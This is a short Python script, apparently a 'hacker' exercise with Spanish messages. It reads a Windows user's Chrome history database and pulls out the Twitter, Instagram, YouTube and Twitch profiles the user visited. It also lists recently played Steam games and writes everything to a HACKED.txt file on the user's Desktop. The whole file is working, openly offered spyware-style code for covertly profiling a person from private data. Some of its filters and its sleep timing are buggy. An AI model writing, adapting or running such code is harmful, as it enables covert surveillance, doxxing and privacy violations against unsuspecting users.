import glob
import os
import sqlite3
from random import randrange
from time import sleep
import re


file_name = "HACKED.txt"


def delay_action():
    n_hours = randrange(1,4)
    print(f"Durmiendo {n_hours} horas")
    sleep(n_hours)


def create_file(user_path):
    desktop_path = user_path + "\\Desktop\\"
    hacker_file = open(desktop_path + file_name, "w")
    return hacker_file


def get_chrome_history(user_path):
    try:
        history_path = f"{user_path}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except:
        print("Reintentando...")


def profile_twitter(chrome_history, file):
    for a in chrome_history:
        param = re.findall("https://twitter.com/([A-Za-z0-9]+)$", a[2])
        if param and param[0] not in ["explore", "home", "settings", "messages"]:
            file.write(f"twitter: {param[0]}\n")



def instagram_profiles(chromehistory, file):
    for a in chromehistory:
        usernames = re.findall("(?:(?:http|https):\/\/)?(?:www.)?(?:instagram.com|instagr.am|instagr.com)\/(\w+)", a[2])
        if usernames and usernames not in ["direct", "explore", "create"]:
            file.write(f"instragram: {usernames[0]}\n")


def youtube_profiles(chrome_history, file):
    for a in chrome_history:
        usernames = re.findall("(?:https|http)\:\/\/(?:[\w]+\.)?youtube\.com\/(?:c\/|channel\/|user\/)?([a-zA-Z0-9\-]{1,})", a[2])
        if usernames and usernames[0] not in ["watch"]:
            file.write(f"youtube: {usernames[0]}\n")


def twitch_profiles(chrome_history, file):
    for a in chrome_history:
        usernames = re.findall("^(?:https?:\/\/)?(?:www\.|go\.)?twitch\.tv\/([a-z0-9_]+)", a[2])
        if usernames and usernames not in ["", "directory"]:
            file.write(f"Twitch: {usernames[0]}\n")


def steamgames(file):
    steam_path = "D:\\steamm\\steamapps\\common\\*"
    games = []
    games_path = glob.glob(steam_path)
    games_path.sort(key=os.path.getmtime, reverse=True)
    for game_path in games_path:
        games.append(game_path.split("\\")[-1])

    for a in games[:5]:
        if a and a not in ["Steamworks Shared", "Steam Controller Configs", "Driver Booster for Steam"]:
            file.write(f"Juego:{a}\n")
def main():
    # delay_action()
    user_path = "C:\\Users\\" + os.getlogin()
    file = create_file(user_path)
    chrome_history = get_chrome_history(user_path)
    profile_twitter(chrome_history, file)
    instagram_profiles(chrome_history, file)
    youtube_profiles(chrome_history, file)
    twitch_profiles(chrome_history, file)
    steamgames(file)

if __name__ == "__main__":
    main()





